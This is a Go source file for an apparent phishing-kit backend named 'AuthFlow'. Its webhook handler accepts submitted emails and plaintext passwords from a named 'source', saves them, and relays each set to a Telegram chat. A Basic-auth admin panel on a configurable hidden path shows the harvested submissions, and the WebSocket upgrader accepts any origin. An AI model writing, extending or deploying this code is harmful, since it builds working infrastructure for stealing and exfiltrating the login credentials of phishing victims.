package server

import (
    "encoding/base64"
    "encoding/json"
    "fmt"
    "html/template"
    "log"
    "net/http"
    "os/exec"
    "strings"
    "sync"
    "time"

    "github.com/gin-gonic/gin"
    "github.com/google/uuid"
    "github.com/gorilla/websocket"

    "authflow/internal/storage"
    "authflow/internal/webhook"
)

type Config struct {
    Domain        string
    VpsIp         string
    TelegramToken string
    TelegramChat  string
    AdminPass     string
    DataDir       string
    Endpoints     map[string]string
    AdminPath     string
    RetentionDays int
    WebhookSecret string
}

type Server struct {
    config    Config
    storage   *storage.Storage
    startTime time.Time
    upgrader  websocket.Upgrader
    wsClients map[*websocket.Conn]bool
    wsMutex   sync.RWMutex
}

func New(cfg Config) (*Server, error) {
    store, err := storage.New(cfg.DataDir)
    if err != nil {
        return nil, err
    }

    return &Server{
        config:    cfg,
        storage:   store,
        startTime: time.Now(),
        upgrader:  websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }},
        wsClients: make(map[*websocket.Conn]bool),
    }, nil
}

func (s *Server) Start(port int) error {
    gin.SetMode(gin.ReleaseMode)
    r := gin.New()
    r.Use(gin.Recovery())
    r.SetTrustedProxies([]string{"127.0.0.1", "::1"})

    r.GET("/health", s.handleHealth)
    r.POST("/api/webhook", s.handleWebhook)

    admin := r.Group("/" + s.config.AdminPath)
    admin.Use(s.adminAuth())
    {
        admin.GET("/", s.handleDashboard)
        admin.GET("/data", s.handleDashboardData)
        admin.POST("/restart", s.handleRestart)
        admin.POST("/cleanup", s.handleCleanup)
    }

    log.Printf("Server started on port %d", port)
    return r.Run(fmt.Sprintf("0.0.0.0:%d", port))
}

func (s *Server) handleHealth(c *gin.Context) {
    c.JSON(200, gin.H{"status": "ok", "uptime": time.Since(s.startTime).Seconds()})
}

func (s *Server) handleWebhook(c *gin.Context) {
    secret := c.GetHeader("X-Webhook-Secret")
    if s.config.WebhookSecret != "" && secret != s.config.WebhookSecret {
        c.JSON(403, gin.H{"error": "Invalid secret"})
        return
    }

    var body map[string]interface{}
    c.ShouldBindJSON(&body)

    event, _ := body["event"].(string)
    source, _ := body["source"].(string)
    email, _ := body["email"].(string)

    if event == "credentials" {
        password, _ := body["password"].(string)
        id := uuid.New().String()
        s.storage.SaveSubmission(id, source, email, password, "", "", false)
        sender := webhook.NewSender(s.config.TelegramToken, s.config.TelegramChat)
        go sender.SendCredentials(source, email, password, "")
        c.JSON(200, gin.H{"success": true, "id": id})
    } else {
        c.JSON(200, gin.H{"success": true})
    }
}

func (s *Server) adminAuth() gin.HandlerFunc {
    return func(c *gin.Context) {
        auth := c.GetHeader("Authorization")
        if !strings.HasPrefix(auth, "Basic ") {
            c.Header("WWW-Authenticate", `Basic realm="AuthFlow"`)
            c.JSON(401, gin.H{"error": "Auth required"})
            c.Abort()
            return
        }
        payload, _ := base64.StdEncoding.DecodeString(auth[6:])
        parts := strings.SplitN(string(payload), ":", 2)
        if len(parts) != 2 || parts[0] != "admin" || parts[1] != s.config.AdminPass {
            c.JSON(403, gin.H{"error": "Invalid credentials"})
            c.Abort()
            return
        }
        c.Next()
    }
}

func (s *Server) handleDashboard(c *gin.Context) {
    c.Header("Content-Type", "text/html; charset=utf-8")
    tmpl, _ := template.New("dashboard").Parse(dashboardHTML)
    tmpl.Execute(c.Writer, gin.H{"domain": s.config.Domain})
}

func (s *Server) handleDashboardData(c *gin.Context) {
    submissions, _ := s.storage.GetSubmissions(20)
    c.JSON(200, gin.H{"stats": gin.H{"submissions": len(submissions)}, "recent": submissions})
}

func (s *Server) handleRestart(c *gin.Context) {
    go func() { time.Sleep(1 * time.Second); exec.Command("systemctl", "restart", "authflow").Run() }()
    c.JSON(200, gin.H{"success": true})
}

func (s *Server) handleCleanup(c *gin.Context) {
    s.storage.Cleanup(s.config.RetentionDays)
    c.JSON(200, gin.H{"success": true})
}

const dashboardHTML = `<!DOCTYPE html>
<html><head><title>AuthFlow</title><style>body{font-family:monospace;background:#0a0e27;color:#fff;padding:20px}</style></head>
<body><h1>AuthFlow Dashboard</h1><div id="stats"></div>
<script>async function load(){const r=await fetch(location.pathname+'/data');const d=await r.json();document.getElementById('stats').innerHTML='Submissions: '+d.stats.submissions;}load();setInterval(load,3000);</script></body></html>`
